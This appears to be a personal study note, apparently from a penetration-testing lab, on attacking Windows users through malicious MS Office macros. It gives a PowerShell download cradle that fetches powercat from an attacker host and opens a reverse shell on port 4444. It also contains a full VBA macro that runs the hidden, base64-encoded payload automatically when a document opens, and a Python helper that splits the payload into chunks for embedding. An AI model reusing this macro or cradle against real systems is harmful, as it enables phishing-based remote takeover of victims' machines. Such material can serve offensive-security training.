**Attack and Exploitation of MS Office, MS Office Macros**

Macros and Client Side Exploitation can be leveraged through phishin,  Watering Hole focused Phising  or other social engineering styled attacks.

```
On Windows 11, Network Level Authentication (NLA)1 is enabled by default for RDP connections and rdesktop won't connect. 
Use xfreerdp instead, which supports NLA for non domain-joined machines. 
```

Connect to the Windows 11 machine using xfreerdp with username and password by ip:
`xfreerdp /u:"{{ username }}" /p:"{{ password }}" /v:"{{ip_address}}" +clipboard`

Download and run powercat on the Windows 11 machine:
*Important*

Iconv -t utf-16le converts the string to little endian format, which is required for powershell to execute the command.

`echo "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.122/powercat.ps1');powercat -c 192.168.119.122 -p 4444 -e powershell " | iconv -t utf-16le | base64 -w 0`

```
Sub AutoOpen()
  MyMacro
End Sub

Sub Document_Open()
  MyMacro
End Sub

Sub MyMacro()
  Dim Str As String
  Set ObjWscript = CreateObject("Wscript.Shell")
  Str = Str + "powershell.exe -nop -w hidden -enc "
  Str = Str + "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUA"
  Str = Str + "YwB0ACAAUwB5AHMAdABlAG0ALgBOAGUA"
  Str = Str + "dAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
  Str = Str + "LgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIA"
  Str = Str + "aQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8A"
  Str = Str + "MQA5ADIALgAxADYAOAAuADEAMQA5AC4A"
  Str = Str + "MQAyADIALwBwAG8AdwBlAHIAYwBhAHQA"
  Str = Str + "LgBwAHMAMQAnACkAOwBwAG8AdwBlAHIA"
  Str = Str + "YwBhAHQAIAAtAGMAIAAxADkAMgAuADEA"
  Str = Str + "NgA4AC4AMQAxADkALgAxADIAMgAgAC0A"
  Str = Str + "cAAgADQANAA0ADQAIAAtAGUAIABwAG8A"
  Str = Str + "dwBlAHIAcwBoAGUAbABsACAACgA="
  ObjWscript.Run Str
End Sub
```

Use Python to split up the powershell command into 50 character chunks:

```
str = "powershell.exe -nop -w hidden -e {{ base64_encoded_command }}"

n = 50

for i in range(0, len(str), n):
    print("Str = Str + " + '"' + str[i:i+n] + '"')
```

<img src="../../../_resources/25b0801019a20d17f06a75e07e8a08aa.png" alt="25b0801019a20d17f06a75e07e8a08aa.png" width="882" height="679" class="jop-noMdConv">